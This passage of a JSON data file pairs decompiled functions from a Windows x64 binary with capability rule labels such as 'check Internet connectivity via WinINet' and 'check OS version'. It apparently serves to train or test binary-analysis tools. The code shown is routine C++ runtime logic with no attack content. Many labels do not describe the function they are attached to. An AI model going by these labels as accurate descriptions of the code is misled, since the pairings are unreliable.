(**(*arg1_00 + 0x30))(arg1_00);\n                }\n                cVar1 = *arg4;\n                if (cVar1 != cVar2) {\n                    if (*(arg1_00 + 7) != '\\0') goto code_r0x00014009c25f;\n                    fcn.140025400(arg1_00);\n                    cVar2 = '0';\n                    if (*(*arg1_00 + 0x30) != 0x140025bf0) {\n                        cVar2 = (**(*arg1_00 + 0x30))(arg1_00);\n                    }\n                    if ((*arg4 != cVar2) || (in_stack_00000030 < 2)) goto code_r0x00014009c184;\n                    if (*(arg1_00 + 7) != '\\0') goto code_r0x00014009c274;\n                    fcn.140025400(arg1_00);\n                    cVar2 = 'x';\n                    if (*(*arg1_00 + 0x30) != 0x140025bf0) {\n                        cVar2 = (**(*arg1_00 + 0x30))(arg1_00);\n                    }\n                    cVar1 = arg4[1];\n                    if (cVar1 != cVar2) {\n                        if (*(arg1_00 + 7) != '\\0') goto code_r0x00014009c287;\n                        cVar2 = fcn.140025b10(arg1_00, 0x58);\n                        cVar1 = arg4[1];\n                        goto code_r0x00014009c290;\n                    }\n                    goto code_r0x00014009c3e0;\n                }\n            }\ncode_r0x00014009c310:\n            *arg3 = cVar2;\n            pcVar7 = arg4 + 1;\n            pcVar4 = arg3 + 1;\n            iVar6 = 1;\n            goto code_r0x00014009c187;\n        }\n        cVar1 = *arg4;\n        cVar2 = cVar1;\n        if (*(arg1_00 + 0x66) == cVar1) goto code_r0x00014009c310;\ncode_r0x00014009c254:\n        cVar2 = cVar1;\n        if (*(arg1_00 + 100) == cVar1) goto code_r0x00014009c310;\ncode_r0x00014009c25f:\n        if ((*(arg1_00 + 0x69) != cVar1) || (in_stack_00000030 < 2)) goto code_r0x00014009c184;\ncode_r0x00014009c274:\n        cVar1 = arg4[1];\n        if (*(arg1_00 + 0xb1) == cVar1) {\ncode_r0x00014009c3e0:\n            pcVar4 = arg3 + 2;\n            pcVar7 = arg4 + 2;\n            iVar6 = 2;\n            *arg3 = *arg4;\n            arg3[1] = arg4[1];\n            goto code_r0x00014009c187;\n        }\ncode_r0x00014009c287:\n        cVar2 = *(arg1_00 + 0x91);\ncode_r0x00014009c290:\n        if (cVar2 == cVar1) goto code_r0x00014009c3e0;\n        if (iVar5 == 0) goto code_r0x000140018630;\n        iVar6 = 0;\ncode_r0x00014009c1ac:\n        sub.msvcrt.dll_memset(pcVar4, arg2, iVar5);\n        arg4 = pcVar7;\n    }\n    else {\ncode_r0x00014009c184:\n        iVar6 = 0;\ncode_r0x00014009c187:\n        arg4 = pcVar7;\n        if (iVar5 != 0) goto code_r0x00014009c1ac;\n    }\n    in_stack_00000030 = in_stack_00000030 - iVar6;\n    if (in_stack_00000030 == 0) {\n        return;\n    }\n    arg3 = pcVar4 + iVar5;\ncode_r0x000140018630:\n    // WARNING: Could not recover jumptable at 0x000140018630. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_memcpy)(arg3, arg4, in_stack_00000030);\n    return;\n}\n",
        "token_count": 1511
    },
    "14009c43": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14009c430(int64_t arg1, ulong arg2, int16_t *arg3, int16_t *arg4)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int16_t *piVar7;\n    int16_t *piVar8;\n    int64_t in_stack_00000028;\n    int64_t in_stack_00000030;\n    \n    uVar2 = *(arg1 + 0x18) & 0xb0;\n    iVar6 = in_stack_00000028 - in_stack_00000030;\n    if (uVar2 == 0x20) {\n        if (in_stack_00000030 != 0) {\n            sub.msvcrt.dll_memcpy(arg3, arg4, in_stack_00000030 * 2);\n        }\n        iVar5 = 0;\n        if (iVar6 == 0) {\n            return;\n        }\n        do {\n            arg3[in_stack_00000030 + iVar5] = arg2;\n            if (iVar6 == iVar5 + 1) {\n                return;\n            }\n            arg3[in_stack_00000030 + iVar5 + 1] = arg2;\n            iVar5 = iVar5 + 2;\n        } while (iVar6 != iVar5);\n        return;\n    }\n    if (uVar2 == 0x10) {\n        piVar4 = fcn.1400b3700(arg1 + 0xd0);\n        iVar1 = (**(*piVar4 + 0x50))(piVar4, 0x2d);\n        if ((*arg4 == iVar1) || (iVar1 = (**(*piVar4 + 0x50))(piVar4, 0x2b),  *arg4 == iVar1)) {\n            *arg3 = iVar1;\n            piVar8 = arg4 + 1;\n            piVar7 = arg3 + 1;\n            iVar5 = 1;\n            goto code_r0x00014009c474;\n        }\n        iVar1 = (**(*piVar4 + 0x50))(piVar4);\n        if ((*arg4 != iVar1) || (in_stack_00000030 < 2)) goto code_r0x00014009c472;\n        iVar1 = (**(*piVar4 + 0x50))(piVar4, 0x78);\n        if ((arg4[1] == iVar1) || (iVar1 = (**(*piVar4 + 0x50))(piVar4),  arg4[1] == iVar1)) {\n            piVar7 = arg3 + 2;\n            piVar8 = arg4 + 2;\n            iVar5 = 2;\n            *arg3 = *arg4;\n            arg3[1] = arg4[1];\n            goto code_r0x00014009c474;\n        }\n        iVar5 = 0;\n        if (iVar6 == 0) goto code_r0x000140018630;\ncode_r0x00014009c479:\n        iVar3 = 0;\n        do {\n            arg3[iVar3] = arg2;\n            iVar3 = iVar3 + 1;\n        } while (iVar6 != iVar3);\n    }\n    else {\ncode_r0x00014009c472:\n        iVar5 = 0;\n        piVar7 = arg3;\n        piVar8 = arg4;\ncode_r0x00014009c474:\n        arg3 = piVar7;\n        arg4 = piVar8;\n        if (iVar6 != 0) goto code_r0x00014009c479;\n    }\n    in_stack_00000030 = in_stack_00000030 - iVar5;\n    if (in_stack_00000030 == 0) {\n        return;\n    }\n    arg3 = arg3 + iVar6;\ncode_r0x000140018630:\n    // WARNING: Could not recover jumptable at 0x000140018630. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.msvcrt.dll_memcpy)(arg3, arg4, in_stack_00000030 * 2);\n    return;\n}\n",
        "token_count": 934
    },
    "14009ca1": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14009ca10(void)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    ulong *puVar3;\n    \n    if (**0x140102a70 == 0) {\n        iVar1 = **0x140102d30;\n        piVar2 = *0x140102d30;\n    }\n    else {\n        fcn.14000e8c0(*0x140102d60, 0x14009caa0);\n        iVar1 = **0x140102d30;\n        piVar2 = *0x140102d30;\n    }\n    if (iVar1 != 0) {\n        *0x140102d30 = piVar2;\n        return;\n    }\n    *0x140102d30 = piVar2;\n    fcn.14009e670(0x1400f9a80, 2);\n    puVar3 = *0x140102d70;\n    *piVar2 = 0x1400f9a80;\n    *puVar3 = 0x1400f9a80;\n    *0x1400fa7c0 = 0x1400f9a80;\n    return;\n}\n",
        "token_count": 265
    },
    "14009d93": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14009d930(int64_t arg1, int64_t *arg2, int64_t arg3)\n\n{\n    uint64_t **ppuVar1;\n    uint64_t *puVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    ulong *arg1_00;\n    int64_t **arg1_01;\n    int64_t iVar5;\n    uint64_t **ppuVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    int32_t *piVar9;\n    \n    piVar9 = *0x140102a70;\n    if (*0x1400f9870 == '\\0') goto code_r0x00014009db78;\n    while ((*piVar9 != 0 && (iVar3 = fcn.14000ea40(0x1400fc340),  iVar3 != 0))) {\n        arg1_00 = fcn.1400b6600(8);\n        *arg1_00 = 0x1401090f0;\n        fcn.1400b6bc0(arg1_00, 0x1401046c0, 0x14001bb60);\ncode_r0x00014009db78:\n        iVar3 = fcn.1400b69d0(0x1400f9870);\n        piVar9 = *0x140102a70;\n        if (iVar3 != 0) {\n            if (**0x140102a70 != 0) {\n                fcn.14000ea00(0x1400fc340);\n            }\n            fcn.1400014f0(0x1400b6d50);\n            fcn.1400b6ad0(0x1400f9870);\n        }\n    }\n    puVar2 = **0x140102d50;\n    iVar3 = *0x1400fb730;\n    ppuVar6 = *0x140102d50;\n    while (iVar8 = arg3,  *0x1400fb730 = iVar3,  puVar2 != NULL) {\n        uVar4 = *puVar2;\n        if (uVar4 == 0) {\n            if (*piVar9 == 0) {\n                *0x1400fb730 = iVar3 + 1;\n                uVar4 = *0x1400fb730;\n                *puVar2 = uVar4;\n                goto code_r0x00014009d9a4;\n            }\n            LOCK();\n            *0x1400fb730 = iVar3 + 1;\n            LOCK();\n            *puVar2 = *puVar2 ^ (*puVar2 == 0) * (*puVar2 ^ iVar3 + 1);\n            uVar4 = *puVar2;\n            puVar2 = ppuVar6[1];\n            uVar7 = *puVar2;\n            iVar3 = *0x1400fb730;\n        }\n        else {\ncode_r0x00014009d9a4:\n            puVar2 = ppuVar6[1];\n            uVar7 = *puVar2;\n            iVar3 = *0x1400fb730;\n        }\n        if (arg3 == uVar4 - 1) {\n            *0x1400fb730 = iVar3;\n            if (uVar7 == 0) {\n                if (*piVar9 == 0) {\n                    *0x1400fb730 = iVar3 + 1;\n                    uVar7 = *0x1400fb730;\n                    *puVar2 = uVar7;\n                }\n                else {\n                    LOCK();\n                    *0x1400fb730 = iVar3 + 1;\n                    LOCK();\n                    *puVar2 = *puVar2 ^ (*puVar2 == 0) * (*puVar2 ^ iVar3 + 1);\n                    uVar7 = *puVar2;\n                }\n            }\n            arg3 = uVar7 - 1;\n            goto code_r0x00014009dadf;\n        }\n        if (uVar7 == 0) {\n            if (*piVar9 == 0) {\n                *0x1400fb730 = iVar3 + 1;\n                uVar7 = *0x1400fb730;\n                *puVar2 = uVar7;\n                iVar3 = *0x1400fb730;\n            }\n            else {\n                LOCK();\n                *0x1400fb730 = iVar3 + 1;\n                LOCK();\n                *puVar2 = *puVar2 ^ (*puVar2 == 0) * (*puVar2 ^ iVar3 + 1);\n                uVar7 = *puVar2;\n                iVar3 = *0x1400fb730;\n            }\n        }\n        if (arg3 == uVar7 - 1) {\n            puVar2 = *ppuVar6;\n            uVar4 = *puVar2;\n            *0x1400fb730 = iVar3;\n            if (uVar4 == 0) {\n                if (*piVar9 == 0) {\n                    *0x1400fb730 = iVar3 + 1;\n                    uVar4 = *0x1400fb730;\n                    *puVar2 = uVar4;\n                }\n                else {\n                    LOCK();\n                    *0x1400fb730 = iVar3 + 1;\n                    LOCK();\n                    *puVar2 = *puVar2 ^ (*puVar2 == 0) * (*puVar2 ^ iVar3 + 1);\n                    uVar4 = *puVar2;\n                }\n            }\n            iVar8 = uVar4 - 1;\n            goto code_r0x00014009dadf;\n        }\n        ppuVar1 = ppuVar6 + 2;\n        ppuVar6 = ppuVar6 + 2;\n        puVar2 = *ppuVar1;\n    }\n    arg3 = -1;\ncode_r0x00014009dadf:\n    iVar5 = *(arg1 + 0x18);\n    arg1_01 = iVar5 + iVar8 * 8;\n    if (*arg1_01 == NULL) goto code_r0x00014009dc00;\n    if (arg2 != NULL) {\n        if (*(*arg2 + 8) == 0x14009f7c0) {\n            fcn.1400b64d0();\n        }\n        else {\n            (**(*arg2 + 8))();\n        }\n    }\n    iVar3 = *piVar9;\n    while( true ) {\n        if (iVar3 == 0) {\n            return;\n        }\n        iVar3 = fcn.14000eab0(0x1400fc340);\n        if (iVar3 == 0) {\n            return;\n        }\n        arg1_01 = fcn.1400b6600(8);\n        arg3 = 0x1401046e0;\n        *arg1_01 = 0x140109120;\n        iVar5 = fcn.1400b6bc0(arg1_01, 0x1401046e0, 0x14001bba0);\ncode_r0x00014009dc00:\n        if (*piVar9 == 0) break;\n        LOCK();\n        *(arg2 + 1) = *(arg2 + 1) + 1;\n        iVar5 = *(arg1 + 0x18);\n        iVar3 = *piVar9;\n        *(iVar5 + iVar8 * 8) = arg2;\n        if (arg3 != -1) {\n            if (iVar3 == 0) {\ncode_r0x00014009dc19:\n                *(arg2 + 1) = *(arg2 + 1) + 1;\n                *(iVar5 + arg3 * 8) = arg2;\n                return;\n            }\n            LOCK();\n            *(arg2 + 1) = *(arg2 + 1) + 1;\n            iVar3 = *piVar9;\n            *(*(arg1 + 0x18) + arg3 * 8) = arg2;\n        }\n    }\n    *(arg2 + 1) = *(arg2 + 1) + 1;\n    *arg1_01 = arg2;\n    if (arg3 == -1) {\n        return;\n    }\n    goto code_r0x00014009dc19;\n}\n",
        "token_count": 1816
    },
    "14009dcf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14009dcf0(int64_t arg1, uint64_t *arg2, int64_t *arg3)\n\n{\n    int64_t *piVar1;\n    int64_t **ppiVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    int64_t iVar11;\n    int64_t *piVar12;\n    uint64_t **ppuVar13;\n    int64_t *piVar14;\n    uint64_t uVar15;\n    uint64_t *puVar16;\n    int32_t *piVar17;\n    uint64_t uVar18;\n    uint64_t *arg2_00;\n    int64_t **ppiVar19;\n    \n    piVar17 = *0x140102a70;\n    if (arg3 == NULL) {\n        return;\n    }\n    uVar18 = *arg2;\n    if (uVar18 == 0) {\n        if (**0x140102a70 != 0) {\n            LOCK();\n            iVar6 = *0x1400fb730 + 1;\n            LOCK();\n            *0x1400fb730 = *0x1400fb730 + 1;\n            *arg2 = *arg2 ^ (*arg2 == 0) * (*arg2 ^ iVar6);\n            uVar18 = *arg2;\n            goto code_r0x00014009dd1b;\n        }\n        *0x1400fb730 = *0x1400fb730 + 1;\n        iVar11 = *(arg1 + 0x10);\n        uVar18 = *0x1400fb730;\n        uVar15 = uVar18 - 1;\n        *arg2 = uVar18;\n        if (iVar11 - 1U < uVar15) goto code_r0x00014009dd30;\n    }\n    else {\ncode_r0x00014009dd1b:\n        uVar15 = uVar18 - 1;\n        if (*(arg1 + 0x10) - 1U < uVar15) {\ncode_r0x00014009dd30:\n            uVar10 = uVar18 + 3;\n            iVar11 = *(arg1 + 8);\n            iVar9 = -1;\n            if (uVar10 < 0x1000000000000000) {\n                iVar9 = uVar10 * 8;\n            }\n            iVar7 = fcn.1400b64f0(iVar9);\n            uVar3 = *(arg1 + 0x10);\n            if (uVar3 != 0) {\n                iVar4 = *(arg1 + 8);\n                uVar8 = 0;\n                do {\n                    *(iVar7 + uVar8 * 8) = *(iVar4 + uVar8 * 8);\n                    uVar8 = uVar8 + 1;\n                } while (uVar8 != uVar3);\n            }\n            if (uVar3 < uVar10) {\n                sub.msvcrt.dll_memset(iVar7 + uVar3 * 8, 0, (uVar10 - uVar3) * 8);\n            }\n            iVar4 = *(arg1 + 0x18);\n            iVar9 = fcn.1400b64f0(iVar9);\n            uVar3 = *(arg1 + 0x10);\n            if (uVar3 != 0) {\n                iVar5 = *(arg1 + 0x18);\n                uVar8 = 0;\n                do {\n                    *(iVar9 + uVar8 * 8) = *(iVar5 + uVar8 * 8);\n                    uVar8 = uVar8 + 1;\n                } while (uVar8 != uVar3);\n            }\n            if (uVar3 < uVar10) {\n                sub.msvcrt.dll_memset(iVar9 + uVar3 * 8, 0, (uVar10 - uVar3) * 8);\n            }\n            *(arg1 + 0x10) = uVar10;\n            *(arg1 + 8) = iVar7;\n            *(arg1 + 0x18) = iVar9;\n            if (iVar11 != 0) {\n                fcn.1400b64c0(iVar11);\n            }\n            if (iVar4 != 0) {\n                fcn.1400b64c0(iVar4);\n            }\n        }\n        piVar17 = *0x140102a70;\n        if (**0x140102a70 != 0) {\n            LOCK();\n            *(arg3 + 1) = *(arg3 + 1) + 1;\n            goto code_r0x00014009de4f;\n        }\n    }\n    *(arg3 + 1) = *(arg3 + 1) + 1;\ncode_r0x00014009de4f:\n    ppiVar2 = *(arg1 + 8) + uVar15 * 8;\n    piVar12 = *ppiVar2;\n    if (piVar12 != NULL) {\n        puVar16 = **0x140102d50;\n        ppuVar13 = *0x140102d50;\n        if (puVar16 != NULL) {\n            do {\n                uVar15 = *puVar16;\n                if (uVar15 != 0) {\ncode_r0x00014009de95:\n                    arg2_00 = ppuVar13[1];\n                    uVar10 = *arg2_00;\n                    if (uVar18 != uVar15) goto code_r0x00014009dea1;\ncode_r0x00014009df20:\n                    iVar11 = *(arg1 + 8);\n                    if (uVar10 == 0) {\n                        if (*piVar17 != 0) {\n                            LOCK();\n                            iVar6 = *0x1400fb730 + 1;\n                            LOCK();\n                            *0x1400fb730 = *0x1400fb730 + 1;\n                            *arg2_00 = *arg2_00 ^ (*arg2_00 == 0) * (*arg2_00 ^ iVar6);\n                            uVar10 = *arg2_00;\n                            goto code_r0x00014009e05f;\n                        }\n                        *0x1400fb730 = *0x1400fb730 + 1;\n                        ppiVar19 = iVar11 + -8 + *0x1400fb730 * 8;\n                        *arg2_00 = *0x1400fb730;\n                        if (*ppiVar19 != NULL) goto code_r0x00014009e210;\ncode_r0x00014009df5e:\n                        piVar12 = *ppiVar2;\n                        goto code_r0x00014009e07e;\n                    }\ncode_r0x00014009e05f:\n                    ppiVar19 = iVar11 + -8 + uVar10 * 8;\n                    if (*ppiVar19 != NULL) {\n                        arg2_00 = ppuVar13[1];\ncode_r0x00014009e210:\n                        piVar12 = fcn.140027320(arg3, arg2_00);\n                        if (*piVar17 == 0) {\n                            *(piVar12 + 1) = *(piVar12 + 1) + 1;\n                            piVar14 = *ppiVar19;\ncode_r0x00014009e22f:\n                            iVar6 = *(piVar14 + 1);\n                            *(piVar14 + 1) = iVar6 + -1;\n                        }\n                        else {\n                            LOCK();\n                            *(piVar12 + 1) = *(piVar12 + 1) + 1;\n                            piVar14 = *ppiVar19;\n                            piVar1 = piVar14 + 1;\n                            if (*piVar17 == 0) goto code_r0x00014009e22f;\n                            LOCK();\n                            iVar6 = *piVar1;\n                            *piVar1 = *piVar1 + -1;\n                        }\n                        if (iVar6 == 1) {\n                            if (*(*piVar14 + 8) != 0x14009f7c0) {\n                                (**(*piVar14 + 8))();\n                                goto code_r0x00014009e23d;\n                            }\n                            goto code_r0x00014009e205;\n                        }\ncode_r0x00014009e23d:\n                        *ppiVar19 = piVar12;\n                        piVar12 = *ppiVar2;\n                        goto code_r0x00014009e073;\n                    }\n                    break;\n                }\n                if (*piVar17 == 0) {\n                    *0x1400fb730 = *0x1400fb730 + 1;\n                    uVar15 = *0x1400fb730;\n                    *puVar16 = uVar15;\n                    goto code_r0x00014009de95;\n                }\n                LOCK();\n                iVar6 = *0x1400fb730 + 1;\n                LOCK();\n                *0x1400fb730 = *0x1400fb730 + 1;\n                *puVar16 = *puVar16 ^ (*puVar16 == 0) * (*puVar16 ^ iVar6);\n                arg2_00 = ppuVar13[1];\n                uVar10 = *arg2_00;\n                if (uVar18 == *puVar16) goto code_r0x00014009df20;\ncode_r0x00014009dea1:\n                iVar6 = *0x1400fb730;\n                if (uVar10 == 0) {\n                    if (*piVar17 == 0) {\n                        *0x1400fb730 = *0x1400fb730 + 1;\n                        uVar10 = *0x1400fb730;\n                        *arg2_00 = uVar10;\n                        iVar6 = *0x1400fb730;\n                    }\n                    else {\n                        LOCK();\n                        iVar6 = *0x1400fb730 + 1;\n                        LOCK();\n                        *0x1400fb730 = *0x1400fb730 + 1;\n                        *arg2_00 = *arg2_00 ^ (*arg2_00 == 0) * (*arg2_00 ^ iVar6);\n                        uVar10 = *arg2_00;\n                        iVar6 = *0x1400fb730;\n                    }\n                }\n                *0x1400fb730 = iVar6;\n                if (uVar18 == uVar10) {\n                    puVar16 = *ppuVar13;\n                    iVar11 = *(arg1 + 8);\n                    uVar18 = *puVar16;\n                    if (uVar18 == 0) {\n                        if (*piVar17 != 0) {\n                            LOCK();\n                            *0x1400fb730 = iVar6 + 1;\n                            LOCK();\n                            *puVar16 = *puVar16 ^ (*puVar16 == 0) * (*puVar16 ^ iVar6 + 1);\n                            uVar18 = *puVar16;\n                            goto code_r0x00014009e1ad;\n                        }\n                        *0x1400fb730 = iVar6 + 1;\n                        ppiVar19 = iVar11 + -8 + *0x1400fb730 * 8;\n                        *puVar16 = *0x1400fb730;\n                        if (*ppiVar19 == NULL) goto code_r0x00014009df5e;\n                    }\n                    else {\ncode_r0x00014009e1ad:\n                        ppiVar19 = iVar11 + -8 + uVar18 * 8;\n                        if (*ppiVar19 == NULL) break;\n                        puVar16 = *ppuVar13;\n                    }\n                    piVar12 = fcn.140026820(arg3, puVar16);\n                    if (*piVar17 == 0) {\n                        *(piVar12 + 1) = *(piVar12 + 1) + 1;\n                        piVar14 = *ppiVar19;\ncode_r0x00014009e1e0:\n                        iVar6 = *(piVar14 + 1);\n                        *(piVar14 + 1) = iVar6 + -1;\n                    }\n                    else {\n                        LOCK();\n                        *(piVar12 + 1) = *(piVar12 + 1) + 1;\n                        piVar14 = *ppiVar19;\n                        piVar1 = piVar14 + 1;\n                        if (*piVar17 == 0) goto code_r0x00014009e1e0;\n                        LOCK();\n                        iVar6 = *piVar1;\n                        *piVar1 = *piVar1 + -1;\n                    }\n                    if (iVar6 == 1) {\n                        if (*(*piVar14 + 8) == 0x14009f7c0) {\ncode_r0x00014009e205:\n                            fcn.1400b64d0();\n                        }\n                        else {\n                            (**(*piVar14 + 8))();\n                        }\n                    }\n                    goto code_r0x00014009e23d;\n                }\n                puVar16 = ppuVar13[2];\n                ppuVar13 = ppuVar13 + 2;\n            } while (puVar16 != NULL);\n            piVar12 = *ppiVar2;\n        }\ncode_r0x00014009e073:\n        if (*piVar17 == 0) {\ncode_r0x00014009e07e:\n            iVar6 = *(piVar12 + 1);\n            *(piVar12 + 1) = iVar6 + -1;\n        }\n        else {\n            LOCK();\n            piVar1 = piVar12 + 1;\n            iVar6 = *piVar1;\n            *piVar1 = *piVar1 + -1;\n        }\n        if (iVar6 == 1) {\n            if (*(*piVar12 + 8) == 0x14009f7c0) {\n                fcn.1400b64d0();\n            }\n            else {\n                (**(*piVar12 + 8))(piVar12);\n            }\n        }\n    }\n    iVar11 = *(arg1 + 0x10);\n    *ppiVar2 = arg3;\n    if (iVar11 != 0) {\n        iVar11 = *(arg1 + 0x18);\n        uVar18 = 0;\n        do {\n            piVar12 = *(iVar11 + uVar18 * 8);\n            if (piVar12 != NULL) {\n                if (*piVar17 == 0) {\n                    iVar6 = *(piVar12 + 1);\n                    *(piVar12 + 1) = iVar6 + -1;\n                }\n                else {\n                    LOCK();\n                    piVar1 = piVar12 + 1;\n                    iVar6 = *piVar1;\n                    *piVar1 = *piVar1 + -1;\n                }\n                if (iVar6 == 1) {\n                    if (*(*piVar12 + 8) == 0x14009f7c0) {\n                        fcn.1400b64d0();\n                    }\n                    else {\n                        (**(*piVar12 + 8))();\n                    }\n                }\n                iVar11 = *(arg1 + 0x18);\n                *(iVar11 + uVar18 * 8) = 0;\n            }\n            uVar18 = uVar18 + 1;\n        } while (uVar18 < *(arg1 + 0x10));\n    }\n    return;\n}\n",
        "token_count": 3383
    },
    "14009f4c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14009f4c0(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    int64_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    \n    piVar3 = *0x140102a70;\n    iVar5 = *(arg1 + 8);\n    if (iVar5 != 0) {\n        if (*(arg1 + 0x10) != 0) {\n            uVar6 = 0;\n            do {\n                piVar2 = *(iVar5 + uVar6 * 8);\n                if (piVar2 != NULL) {\n                    if (*piVar3 == 0) {\n                        iVar4 = *(piVar2 + 1);\n                        *(piVar2 + 1) = iVar4 + -1;\n                    }\n                    else {\n                        LOCK();\n                        piVar1 = piVar2 + 1;\n                        iVar4 = *piVar1;\n                        *piVar1 = *piVar1 + -1;\n                    }\n                    if (iVar4 == 1) {\n                        if (*(*piVar2 + 8) == 0x14009f7c0) {\n                            fcn.1400b64d0();\n                        }\n                        else {\n                            (**(*piVar2 + 8))();\n                        }\n                    }\n                    iVar5 = *(arg1 + 8);\n                }\n                uVar6 = uVar6 + 1;\n            } while (uVar6 < *(arg1 + 0x10));\n            if (iVar5 == 0) goto code_r0x00014009f54d;\n        }\n        fcn.1400b64c0(iVar5);\n    }\ncode_r0x00014009f54d:\n    piVar3 = *0x140102a70;\n    iVar5 = *(arg1 + 0x18);\n    if (iVar5 != 0) {\n        if (*(arg1 + 0x10) != 0) {\n            uVar6 = 0;\n            do {\n                piVar2 = *(iVar5 + uVar6 * 8);\n                if (piVar2 != NULL) {\n                    if (*piVar3 == 0) {\n                        iVar4 = *(piVar2 + 1);\n                        *(piVar2 + 1) = iVar4 + -1;\n                    }\n                    else {\n                        LOCK();\n                        piVar1 = piVar2 + 1;\n                        iVar4 = *piVar1;\n                        *piVar1 = *piVar1 + -1;\n                    }\n                    if (iVar4 == 1) {\n                        if (*(*piVar2 + 8) == 0x14009f7c0) {\n                            fcn.1400b64d0();\n                        }\n                        else {\n                            (**(*piVar2 + 8))();\n                        }\n                    }\n                    iVar5 = *(arg1 + 0x18);\n                }\n                uVar6 = uVar6 + 1;\n            } while (uVar6 < *(arg1 + 0x10));\n            if (iVar5 == 0) goto code_r0x00014009f5cd;\n        }\n        fcn.1400b64c0(iVar5);\n    }\ncode_r0x00014009f5cd:\n    iVar5 = *(arg1 + 0x20);\n    iVar7 = 0;\n    if (iVar5 != 0) {\n        do {\n            if (*(iVar5 + iVar7) != 0) {\n                fcn.1400b64c0();\n                iVar5 = *(arg1 + 0x20);\n            }\n            iVar7 = iVar7 + 8;\n        } while (iVar7 != 0x30);\n        if (iVar5 != 0) {\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)(iVar5);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 899
    },
    "14009f75": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14009f750(ulong *arg1, char *arg2)\n\n{\n    *arg1 = 0;\n    if (*arg2 == 'C') goto code_r0x00014009f770;\n    do {\n        fcn.1400b7210(\"locale::facet::_S_create_c_locale name not valid\");\ncode_r0x00014009f770:\n    } while (arg2[1] != '\\0');\n    return;\n}\n",
        "token_count": 101
    },
    "14009fb8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.14009fb80(int32_t **arg1, int32_t **arg2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    \n    piVar3 = *0x1400fb720;\n    piVar2 = *arg2;\n    if (piVar2 != *0x1400fb720) {\n        if (**0x140102a70 == 0) {\n            *piVar2 = *piVar2 + 1;\n        }\n        else {\n            LOCK();\n            *piVar2 = *piVar2 + 1;\n            piVar3 = *0x1400fb720;\n        }\n    }\n    piVar2 = *arg1;\n    if (piVar2 != piVar3) {\n        if (**0x140102a70 == 0) {\n            iVar1 = *piVar2;\n            *piVar2 = iVar1 + -1;\n        }\n        else {\n            LOCK();\n            iVar1 = *piVar2;\n            *piVar2 = *piVar2 + -1;\n        }\n        if (iVar1 == 1) {\n            fcn.14009f4c0(piVar2);\n            fcn.1400b64d0(piVar2);\n            *arg1 = *arg2;\n            return;\n        }\n    }\n    *arg1 = *arg2;\n    return;\n}\n",
        "token_count": 311
    },
    "1400a0b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
